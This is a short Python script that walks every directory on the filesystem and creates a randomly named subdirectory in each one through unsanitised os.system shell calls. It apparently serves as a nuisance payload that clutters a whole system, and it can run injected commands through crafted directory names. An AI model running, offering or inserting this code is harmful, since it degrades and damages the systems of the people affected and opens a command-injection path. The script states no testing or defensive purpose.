#!/usr/bin/env python

import subprocess, random, base64, os

proc = subprocess.Popen('find / -type d', stdout=subprocess.PIPE, shell=True)
out, err = proc.communicate()

l = out.split()

for t in l:
	t = t + '/'
	for i in range(1):
		p = random.randint(10000,1000000000)
		z = "mkdir {0}{1}".format(t, str(p))
		os.system(z)
